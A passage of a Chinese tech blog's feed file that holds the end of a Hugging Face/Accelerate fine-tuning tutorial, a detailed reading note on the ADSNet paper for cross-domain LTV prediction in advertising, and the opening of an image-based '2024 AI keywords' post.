class="line">        outputs = model(**batch)</span><br><span class="line"></span><br><span class="line">    logits = outputs.logits</span><br><span class="line">    predictions = torch.argmax(logits, dim=-<span class="number">1</span>)</span><br><span class="line">    metric.add_batch(predictions=predictions, references=batch[<span class="string">&quot;labels&quot;</span>])</span><br><span class="line"></span><br><span class="line">metric.compute()</span><br></pre></td></tr></table></figure><h2 id="4-6-使用Accelerate进行加速"><a href="#4-6-使用Accelerate进行加速" class="headerlink" title="4.6 使用Accelerate进行加速"></a>4.6 使用Accelerate进行加速</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> accelerate <span class="keyword">import</span> Accelerator</span><br><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> AdamW</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForSequenceClassification, get_scheduler</span><br><span class="line"></span><br><span class="line">accelerator = Accelerator()</span><br><span class="line"></span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(checkpoint, num_labels=<span class="number">2</span>)</span><br><span class="line">optimizer = AdamW(model.parameters(), lr=<span class="number">3e-5</span>)</span><br><span class="line"></span><br><span class="line">train_dl, eval_dl, model, optimizer = accelerator.prepare(</span><br><span class="line">    train_dataloader, eval_dataloader, model, optimizer</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">num_epochs = <span class="number">3</span></span><br><span class="line">num_training_steps = num_epochs * <span class="built_in">len</span>(train_dl)</span><br><span class="line">lr_scheduler = get_scheduler(</span><br><span class="line">    <span class="string">&quot;linear&quot;</span>,</span><br><span class="line">    optimizer=optimizer,</span><br><span class="line">    num_warmup_steps=<span class="number">0</span>,</span><br><span class="line">    num_training_steps=num_training_steps,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">progress_bar = tqdm(<span class="built_in">range</span>(num_training_steps))</span><br><span class="line"></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epochs):</span><br><span class="line">    <span class="keyword">for</span> batch <span class="keyword">in</span> train_dl:</span><br><span class="line">        outputs = model(**batch)</span><br><span class="line">        loss = outputs.loss</span><br><span class="line">        accelerator.backward(loss)</span><br><span class="line"></span><br><span class="line">        optimizer.step()</span><br><span class="line">        lr_scheduler.step()</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        progress_bar.update(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读9：ADSNet</title>
      <link href="/2025/02/17/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB9%EF%BC%9AADSNet/"/>
      <url>/2025/02/17/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB9%EF%BC%9AADSNet/</url>
      
        <content type="html"><![CDATA[<h1 id="探索ADSNet：广告领域跨域LTV预测的创新突破"><a href="#探索ADSNet：广告领域跨域LTV预测的创新突破" class="headerlink" title="探索ADSNet：广告领域跨域LTV预测的创新突破"></a>探索ADSNet：广告领域跨域LTV预测的创新突破</h1><h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h2><p>在当今数字化广告的时代，客户终身价值（LTV，Lifetime Value）预测已成为广告行业的关键环节。LTV代表着一个客户在与广告商互动的整个周期内所贡献的累计价值，这一指标直接关联着广告商的投资回报率（ROI）。精准的LTV预测对于广告系统的优化意义重大，它能够帮助广告商合理分配广告预算，精准定位高价值客户，从而制定更具针对性的营销策略，提升广告投放的效果和效率。</p><p>然而，在实际操作中，LTV预测面临着诸多挑战，其中数据稀疏性问题尤为突出。从广告转化漏斗（如图1）来看，在从曝光到购买的过程中，数据量呈现出指数级的下降。曝光量可能达到$10^9$级别，点击量为$10^7$，激活量为$10^6$，但购买量仅为$10^4$（内部数据）和$6*10^5$（外部数据）。如此少量的购买样本，使得传统的深度学习模型难以充分挖掘数据中的潜在模式和特征，进而严重制约了LTV预测的准确性。</p><p>为了解决这些问题，研究人员不断探索新的方法和技术。其中，跨域迁移学习成为了备受关注的方向，它旨在利用外部数据（源域）的知识来辅助广告平台内部数据（目标域）的学习，以缓解数据稀疏的影响。但在跨域迁移学习中，数据分布差异导致的负迁移问题又成为了新的阻碍。在此背景下，论文“ADSNet: Cross - Domain LTV Prediction with an Adaptive Siamese Network in Advertising”提出的自适应差异孪生网络（ADSNet），为解决广告系统中LTV预测的难题提供了创新的解决方案。</p><p><img src="/2025/02/17/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB9%EF%BC%9AADSNet/image_uDusDVJg50.png"></p><p><em>图1：广告系统转化漏斗及挑战，展示了内部购买数据的稀疏性、引入外部数据的情况以及数据分布差异导致的负迁移问题</em></p><hr><h2 id="2-相关工作"><a href="#2-相关工作" class="headerlink" title="2 相关工作"></a>2 相关工作</h2><h3 id="2-1-LTV-预测方法"><a href="#2-1-LTV-预测方法" class="headerlink" title="2.1 LTV 预测方法"></a>2.1 LTV 预测方法</h3><p>在LTV预测领域，研究人员进行了大量的探索。早期的方法主要基于传统的统计模型，如回归分析、生存分析等。这些方法虽然理论基础扎实，但在处理复杂的用户行为和大规模数据时，表现出了明显的局限性。随着深度学习的发展，基于神经网络的方法逐渐占据主导地位。例如，深度神经网络（DNN）通过构建多层隐藏层，可以自动学习数据中的复杂特征，从而提高LTV预测的准确性。还有一些研究尝试利用循环神经网络（RNN）及其变体，如长短期记忆网络（LSTM）和门控循环单元（GRU），来捕捉用户行为的时间序列特征，因为用户的购买行为往往具有一定的时间依赖性。</p><p>然而，这些方法在面对数据稀疏问题时，仍然存在不足。由于购买样本的稀缺，模型难以学习到足够的有效信息，导致预测精度受限。例如，在实际的广告场景中，很多用户可能只是偶尔购买一次，这种低频购买行为使得模型难以从有限的样本中学习到准确的模式。</p><h3 id="2-2-跨域迁移学习方法"><a href="#2-2-跨域迁移学习方法" class="headerlink" title="2.2 跨域迁移学习方法"></a>2.2 跨域迁移学习方法</h3><p>跨域迁移学习旨在将一个领域（源域）的知识迁移到另一个领域（目标域），以解决目标域数据不足的问题。在广告领域，跨域迁移学习主要用于利用外部数据来提升LTV预测的性能。常见的跨域迁移学习方法包括基于特征对齐的方法、基于对抗学习的方法和基于多任务学习的方法。</p><p>基于特征对齐的方法，如深度适配网络（DAN），通过最小化源域和目标域特征分布之间的差异，来实现知识的迁移。具体来说，DAN使用多核最大均值差异（MK - MMD）来度量两个域的特征分布差异，并在训练过程中不断调整模型参数，使得源域和目标域的特征分布尽可能接近。这种方法的优点是简单直观，能够在一定程度上减少域间差异。但它的局限性在于，仅仅对齐特征分布可能无法充分利用源域的有效知识，而且对于复杂的域差异情况，效果可能不尽如人意。</p><p>基于对抗学习的方法，如域对抗神经网络（DANN），通过引入对抗训练机制来学习域不变特征。在DANN中，有一个判别器用于区分样本来自源域还是目标域，同时生成器（通常是模型的特征提取部分）试图生成让判别器无法区分域别的特征表示。通过这种对抗过程，模型可以学习到对域不敏感的特征，从而实现跨域迁移。然而，对抗学习的训练过程通常比较复杂，需要仔细调整超参数，而且容易出现梯度消失或梯度爆炸的问题，导致模型不稳定。</p><p>基于多任务学习的方法，如多门混合专家模型（MMOE），通过在多个相关任务上进行联合训练，共享部分模型参数，从而提高模型的泛化能力和跨域迁移能力。在LTV预测中，可以将不同域的LTV预测任务看作是多个相关任务，通过MMOE模型进行联合学习。这种方法的优点是能够充分利用多个任务之间的相关性，提高模型的学习效率。但它也存在一些问题，比如不同任务之间的平衡难以把握，如果任务之间的差异较大，可能会导致模型在某些任务上的性能下降。</p><table><thead><tr><th>方法类型</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>基于特征对齐的方法</td><td>简单直观，能减少域间差异</td><td>难以充分利用源域知识，对复杂域差异效果不佳</td></tr><tr><td>基于对抗学习的方法</td><td>可学习域不变特征</td><td>训练复杂，易出现梯度问题，模型不稳定</td></tr><tr><td>基于多任务学习的方法</td><td>利用任务相关性，提高学习效率</td><td>任务平衡难把握，任务差异大时性能易下降</td></tr></tbody></table><p>与上述方法相比，ADSNet针对广告领域LTV预测的特点，提出了独特的解决方案。它不仅考虑了数据稀疏性和跨域迁移问题，还通过创新的架构设计和训练策略，有效地解决了负迁移问题，为LTV预测提供了更高效、更准确的方法。</p><hr><h2 id="3-技术细节"><a href="#3-技术细节" class="headerlink" title="3 技术细节"></a>3 技术细节</h2><h3 id="3-1-LTV预测骨干网络"><a href="#3-1-LTV预测骨干网络" class="headerlink" title="3.1 LTV预测骨干网络"></a>3.1 LTV预测骨干网络</h3><p>ADSNet的骨干网络由编码层、专家层和塔层构成，旨在更好地适应LTV在实际广告场景中的复杂分布。</p><ul><li><strong>编码层</strong>：编码层负责对输入特征进行处理和编码。在广告场景中，输入特征包括用户特征（如年龄、性别、地理位置、浏览历史等）和广告特征（如广告类型、广告内容、投放时间等）。编码层首先将这些特征进行分类，然后将不同类型的特征编码为嵌入向量。例如，将用户的年龄特征映射到一个低维向量空间，使得年龄相近的用户在向量空间中的距离也较近。为了进一步捕捉特征之间的交互关系，编码层采用了Field - weighted Factorization Machines（FwFM）。FwFM可以根据不同特征域的重要性，对特征之间的交互进行加权，从而更准确地建模特征之间的复杂关系。</li><li><strong>专家层</strong>：专家层借鉴了Mixture of Experts（MoE）架构的思想，采用了Progressive Layered Extraction（PLE）。PLE由一组专家网络和一个门控网络组成。每个专家网络都是一个多层感知机（MLP），负责学习输入数据的特定方面或模式。例如，有的专家网络可能擅长学习用户的长期购买偏好，而有的则对广告的短期流行趋势更敏感。门控网络根据输入数据的特点，为每个专家网络分配不同的权重，从而决定每个专家网络对最终输出的贡献。通过这种方式，专家层能够更全面、更深入地学习输入数据的特征。</li><li><strong>塔层</strong>：考虑到LTV的长-tailed和多模态分布特点，塔层扩展了一个多粒度预测模块。该模块分为两个部分：购买概率预测和购买金额预测。在购买概率预测中，使用一个基于MLP的分类器来估计每个样本的购买可能性，采用交叉熵损失函数来优化模型。对于购买金额预测，ADSNet没有采用传统的基于ZILN（Zero - Inflated LogNormal）的方法，而是设计了一个多类分类模块结合有序分类。具体来说，将LTV分布划分为多个子分布，通过多个二元分类器对每个子分布进行预测。这种方法能够更好地捕捉购买金额的有序性质，更符合实际购买行为的特点。</li></ul><h3 id="3-2-差异伪孪生网络"><a href="#3-2-差异伪孪生网络" class="headerlink" title="3.2 差异伪孪生网络"></a>3.2 差异伪孪生网络</h3><p>差异伪孪生网络是ADSNet的核心创新之一，它由香草网络和增益网络组成（如图2）。香草网络仅使用内部数据进行训练，专注于学习目标域（内部数据）的特征和模式。增益网络则同时接收内部和外部数据，旨在通过融合外部数据的信息来增强模型的泛化能力。</p><p>在训练过程中，两个网络的参数同时更新。增益网络通过与香草网络的对比，学习到外部数据中对目标域有益的信息，并将这些信息传递给香草网络。例如，如果增益网络发现某些外部数据中的用户行为模式与内部数据中的高价值用户行为模式相似，它就可以将这些模式的特征信息传递给香草网络，帮助香草网络更好地识别潜在的高价值用户。这种结构使得模型能够有效地利用外部数据，同时避免了直接将外部数据引入可能带来的负迁移问题。</p><p><img src="/2025/02/17/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB9%EF%BC%9AADSNet/image_PGUYgRc05J.png"></p><p><em>图2：传统多域模型与ADSNet的对比，展示了ADSNet如何通过伪孪生网络评估信息增益，拒绝负增益样本</em></p><h3 id="3-3-增益评估策略"><a href="#3-3-增益评估策略" class="headerlink" title="3.3 增益评估策略"></a>3.3 增益评估策略</h3><p>为了进一步优化对外部数据的利用，ADSNet提出了增益评估策略。该策略基于伪孪生网络结构，通过对比香草网络和增益网络的输出，计算输入数据对模型性能的贡献，即信息增益。</p><p>具体来说，定义增益$W_G$为$Score_{gain} - Score_{van}$，其中$Score(·)$是增益度量函数。在实际计算中，通过比较两个网络在内部样本上计算的损失差异来量化外部数据对增益网络的增益。公式表示为$W_G &#x3D; \mathcal{L}<em>{van,t} - \mathcal{L}</em>{gain,t}$，其中$\mathcal{L}<em>{van,t}$是香草网络在内部数据上的损失，$\mathcal{L}</em>{gain,t}$是增益网络在内部数据上的损失。如果$W_G &gt; 0$，则说明外部数据对内部域有正增益，即外部数据对模型性能有提升作用；反之，如果$W_G &lt; 0$，则可能存在负迁移，模型会拒绝这些外部数据。这种策略使得模型能够自动筛选出对目标域有益的外部数据，避免引入噪声数据，从而提高模型的性能。</p><h3 id="3-4-域适应模块"><a href="#3-4-域适应模块" class="headerlink" title="3.4 域适应模块"></a>3.4 域适应模块</h3><p>域适应模块是ADSNet中连接增益网络和香草网络的关键桥梁，用于减少不同域之间的数据分布差异。该模块在塔模块的底部集成了一个适配器层，适配器层由一个MLP实现。</p><p>适配器层首先估计外部数据的重要性$W_s$，计算公式为$W_s &#x3D; 1 &#x2F; exp(sigmoid(MLP(e_i)))$，其中$e_i$是编码层输出的嵌入向量。通过这个公式，适配器层可以根据外部数据的特征，动态地调整其对模型的重要性权重。</p><p>为了进一步约束增益网络和香草网络之间的分布一致性，域适应模块考虑了低层次的嵌入层和高层次的塔层两个层次的分布差异。采用知识蒸馏的方法，通过均方误差（MSE）来约束两个网络的分布。具体来说，计算嵌入层的损失$\mathcal{L}<em>{embed} &#x3D; MSE(E^{V}, E^{G})$，其中$E^{V}$和$E^{G}$分别是香草网络和增益网络的嵌入向量；计算塔层适配器输出的损失$\mathcal{L}</em>{task_tower} &#x3D; MSE(H_{adapter }^{V}, H_{adapter }^{G})$，其中$H_{adapter }^{V}$和$H_{adapter }^{G}$分别是香草网络和增益网络塔层适配器的输出。域适应模块的总损失为$\mathcal{L}<em>{domain} &#x3D; \mathcal{L}</em>{embed} + \mathcal{L}_{task_tower}$。通过这种方式，域适应模块能够有效地减少域间差异，增强模型在不同域之间的适应性。</p><h3 id="3-5-训练目标与策略"><a href="#3-5-训练目标与策略" class="headerlink" title="3.5 训练目标与策略"></a>3.5 训练目标与策略</h3><p>ADSNet的训练目标是通过联合优化多个损失函数，实现对模型的有效训练。总损失函数定义为：$\mathcal{L}<em>{total} &#x3D; \mathcal{L}</em>{gain} + \mathcal{L}<em>{van} + \beta * \mathcal{L}</em>{domain}$，其中$\mathcal{L}<em>{gain}$是增益网络的损失，$\mathcal{L}</em>{van}$是香草网络的损失，$\beta$是控制域适应损失权重的超参数。增益网络的损失计算为$\mathcal{L}<em>{gain} &#x3D; W</em>{s} \cdot \mathcal{L}<em>{gain,s } \mathbb{1}(W</em>{G}&gt;0) + \mathcal{L}<em>{gain,t}$，其中$\mathcal{L}</em>{gain,s}$是增益网络在外部数据上的损失，$\mathcal{L}<em>{gain,t}$是增益网络在内部数据上的损失，$W</em>{s}$是外部数据的权重，$\mathbb{1}(W_{G}&gt;0)$是指示函数，只有当$W_{G}&gt;0$时，才会考虑外部数据的损失对增益网络的影响。</p><p>在训练策略上，ADSNet采用了迭代对齐策略（如图3）。训练过程分为两个阶段：热身阶段和联合训练阶段。在热身阶段，仅使用内部样本训练香草网络，使香草网络能够建立一个稳定的基础模型。在联合训练阶段，首先将增益网络的参数初始化为香草网络的参数，然后同时使用内部和外部样本训练两个网络。在训练过程中，每隔一定的步数（例如500步），将香草网络的参数同步为增益网络的参数，以防止两个网络的参数差异过大，确保模型能够有效地融合内外部数据的信息。</p><p><img src="/2025/02/17/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB9%EF%BC%9AADSNet/image_4_fsaCjr4N.png"></p><p><em>图3：迭代对齐策略的训练流程，确保两个网络在训练过程中保持参数同步，有效融合内外部数据信息</em></p><hr><h2 id="4-实验与结果"><a href="#4-实验与结果" class="headerlink" title="4 实验与结果"></a>4 实验与结果</h2><h3 id="4-1-实验设计"><a href="#4-1-实验设计" class="headerlink" title="4.1 实验设计"></a>4.1 实验设计</h3><p>为了验证ADSNet的有效性，作者进行了全面的实验。实验主要包括与多种基线模型的对比，以及对ADSNet各个组件的消融实验。对比模型包括单域模型（如DeepFM、ZILN等）和跨域模型（如Share - Bottom、MMOE等）。通过与这些模型的对比，可以清晰地评估ADSNet在LTV预测任务上的性能提升。</p><p>消融实验则是分别去掉ADSNet中的增益评估策略、域适应模块和迭代对齐策略，观察模型性能的变化。通过这种方式，可以深入了解每个组件对模型整体性能的贡献。</p><h3 id="4-2-数据集"><a href="#4-2-数据集" class="headerlink" title="4.2 数据集"></a>4.2 数据集</h3><p>由于缺乏公开的LTV预测数据集，作者构建了一个行业数据集。该数据集收集了腾讯在线广告系统90天的转换日志，涵盖了四个内部业务域和来自其他平台的授权外部数据。数据集包含数十亿个样本，并按照时间轴进行划分，其中70天的样本用于训练，10天的样本用于验证，10天的样本用于测试。数据集的统计信息如下表所示：</p><table><thead><tr><th>域</th><th>样本数量</th><th>平均LTV</th></tr></thead><tbody><tr><td>内部数据 - Domain1</td><td>9,136</td><td>0.34</td></tr><tr><td>内部数据 - Domain2</td><td>15,706</td><td>0.53</td></tr><tr><td>内部数据 - Domain3</td><td>34,129</td><td>4.82</td></tr><tr><td>外部数据</td><td>225,490</td><td>8.02</td></tr></tbody></table><p>从表中可以看出，不同域的数据分布存在明显差异，外部数据的平均LTV与内部数据有较大不同，这为评估模型在跨域数据上的性能提供了良好的测试环境。</p><h3 id="4-3-评估指标"><a href="#4-3-评估指标" class="headerlink" title="4.3 评估指标"></a>4.3 评估指标</h3><p>实验采用了两个常用的评估指标来衡量模型的性能：AUC（Area Under the Curve）和归一化基尼系数（Norm GINI）。AUC用于评估模型识别购买用户的能力，它衡量了模型在区分正样本（购买用户）和负样本（非购买用户）方面的表现。AUC值越高，说明模型能够更好地区分购买和非购买用户。</p><p>归一化基尼系数则用于评估模型根据预测的LTV对用户进行准确排序的能力。与均方误差（MSE）相比，归一化基尼系数对异常值更具鲁棒性，并且在商业场景中具有更好的解释性。该系数的取值范围在0到1之间，值越接近1，表示模型根据预测LTV对用户的排序与真实LTV的排序一致性越高。</p><h3 id="4-4-实验结果"><a href="#4-4-实验结果" class="headerlink" title="4.4 实验结果"></a>4.4 实验结果</h3><ul><li><strong>对比模型性能比较</strong>：实验结果表明，ADSNet的骨干模型（ADSNet - Backbone）已经优于其他单域模型，这说明其针对LTV预测设计的网络架构具有优势。例如，在Domain1上，ADSNet - Backbone的AUC达到0.763，GINI达到0.770，而DeepFM的AUC仅为0.719，GINI为0.731。完整的ADSNet模型在跨域方法中表现最佳，在所有域的数据集上，其AUC和GINI都有显著提升。以Domain3为例，ADSNet的AUC达到0.9614，GINI达到0.9570，相比其他跨域模型有明显优势（具体数据见原论文表2）。</li><li><strong>消融实验结果</strong>：消融实验的结果进一步验证了ADSNet各个组件的重要性（见原论文表3）。去掉增益评估策略后，模型的GINI从0.856下降到0.824，这表明增益评估策略在拒绝噪声样本、避免负迁移方面发挥了关键作用。去掉域适应模块后，GINI下降了2.3%，说明约束增益网络和香草网络之间的分布差异有助于提高知识迁移的效果。去掉迭代对齐策略后，GINI也有所下降。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 增长&amp;广告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ADSNet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年AI年度关键词</title>
      <link href="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/"/>
      <url>/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="1-图像"><a href="#1-图像" class="headerlink" title="1 图像"></a>1 图像</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_CVGUlhEsf3.png"></p><h2 id="1-1-DIT-架构"><a href="#1-1-DIT-架构" class="headerlink" title="1.1 DIT 架构"></a>1.1 DIT 架构</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_Kr2DLW4y2w.png"></p><h2 id="1-2-图像生成控制"><a href="#1-2-图像生成控制" class="headerlink" title="1.2 图像生成控制"></a>1.2 图像生成控制</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_SZQH0taSPR.png"></p><h2 id="1-3-高分辨率图像处理"><a href="#1-3-高分辨率图像处理" class="headerlink" title="1.3 高分辨率图像处理"></a>1.3 高分辨率图像处理</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_W2UlvNJgnR.png"></p><h2 id="1-4-AI-图像商业化"><a href="#1-4-AI-图像商业化" class="headerlink" title="1.4 AI 图像商业化"></a>1.4 AI 图像商业化</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_aQZsb9UgkA.png"></p><h2 id="1-5-医疗-AI"><a href="#1-5-医疗-AI" class="headerlink" title="1.5 医疗 AI"></a>1.5 医疗 AI</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_WNdfcnp3kQ.png"></p><hr><h1 id="2-视频"><a href="#2-视频" class="headerlink" title="2 视频"></a>2 视频</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_0-2SkqVu2x.png"></p><h2 id="2-1-规模化训练"><a href="#2-1-规模化训练" class="headerlink" title="2.1 规模化训练"></a>2.1 规模化训练</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_lUpZsyq6HC.png"></p><h2 id="2-2-下一帧预测"><a href="#2-2-下一帧预测" class="headerlink" title="2.2 下一帧预测"></a>2.2 下一帧预测</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_K2mzgPNxFx.png"></p><h2 id="2-3-艺术家共创"><a href="#2-3-艺术家共创" class="headerlink" title="2.3 艺术家共创"></a>2.3 艺术家共创</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_DdAr_pudZb.png"></p><h2 id="2-4-AI-原生创作"><a href="#2-4-AI-原生创作" class="headerlink" title="2.4 AI 原生创作"></a>2.4 AI 原生创作</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_MKGYVIkvf6.png"></p><h2 id="2-5-生成式游戏"><a href="#2-5-生成式游戏" class="headerlink" title="2.5 生成式游戏"></a>2.5 生成式游戏</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_eCM7ifZ4h6.png"></p><h2 id="2-6-世界模拟器"><a href="#2-6-世界模拟器" class="headerlink" title="2.6 世界模拟器"></a>2.6 世界模拟器</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_2knGDyn3Iz.png"></p><hr><h1 id="3-3D-生成"><a href="#3-3D-生成" class="headerlink" title="3 3D 生成"></a>3 3D 生成</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_uOc2ihfKVQ.png"></p><h2 id="3-1-几何形态还原"><a href="#3-1-几何形态还原" class="headerlink" title="3.1 几何形态还原"></a>3.1 几何形态还原</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_VH-vk8QTJB.png"></p><h2 id="3-2-材质还原"><a href="#3-2-材质还原" class="headerlink" title="3.2 材质还原"></a>3.2 材质还原</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_YCj9B5U1xO.png"></p><h2 id="3-3-高斯泼溅"><a href="#3-3-高斯泼溅" class="headerlink" title="3.3 高斯泼溅"></a>3.3 高斯泼溅</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_tAoLa8pPCa.png"></p><h2 id="3-4-3D-训练数据"><a href="#3-4-3D-训练数据" class="headerlink" title="3.4 3D 训练数据"></a>3.4 3D 训练数据</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_eJFQPeDjzQ.png"></p><h2 id="3-5-AI-元宇宙"><a href="#3-5-AI-元宇宙" class="headerlink" title="3.5 AI 元宇宙"></a>3.5 AI 元宇宙</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_j11RjfBMqs.png"></p><h2 id="3-6-3D-UGC"><a href="#3-6-3D-UGC" class="headerlink" title="3.6 3D UGC"></a>3.6 3D UGC</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_QZUXo8ijDr.png"></p><hr><h1 id="4-编程助手"><a href="#4-编程助手" class="headerlink" title="4 编程助手"></a>4 编程助手</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_ze0y61VXUn.png"></p><h2 id="4-1-全栈生成"><a href="#4-1-全栈生成" class="headerlink" title="4.1 全栈生成"></a>4.1 全栈生成</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_QHtli8UCIE.png"></p><h2 id="4-2-画布工坊"><a href="#4-2-画布工坊" class="headerlink" title="4.2 画布工坊"></a>4.2 画布工坊</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_X1E2C1a8_Q.png"></p><h2 id="4-3-云端沙盒"><a href="#4-3-云端沙盒" class="headerlink" title="4.3 云端沙盒"></a>4.3 云端沙盒</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_zQenZ2jFBA.png"></p><h2 id="4-4-动态-UI"><a href="#4-4-动态-UI" class="headerlink" title="4.4 动态 UI"></a>4.4 动态 UI</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_E_NsmiBhYe.png"></p><h2 id="4-5-推理-Debug"><a href="#4-5-推理-Debug" class="headerlink" title="4.5 推理 Debug"></a>4.5 推理 Debug</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_RTdwObvTpu.png"></p><hr><h1 id="5-Agent"><a href="#5-Agent" class="headerlink" title="5 Agent"></a>5 Agent</h1><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image__ESPGKEM73.png"></p><h2 id="5-1-社会模拟"><a href="#5-1-社会模拟" class="headerlink" title="5.1 社会模拟"></a>5.1 社会模拟</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_wEbHq1M76L.png"></p><h2 id="5-2-智能体协作框架"><a href="#5-2-智能体协作框架" class="headerlink" title="5.2 智能体协作框架"></a>5.2 智能体协作框架</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_DDRm0amSNg.png"></p><h2 id="5-3-智能体应用"><a href="#5-3-智能体应用" class="headerlink" title="5.3 智能体应用"></a>5.3 智能体应用</h2><p><img src="/2025/01/27/2024%E5%B9%B4AI%E5%B9%B4%E5%BA%A6%E5%85%B3%E9%94%AE%E8%AF%8D/image_JtEYEnr17q.png"></p><h2 id="5-4-自主执行"><a href="#5-4-自主执行" class="headerlink" title="5.4 自主执行"></a>5.4 自主执行</h2><p><img 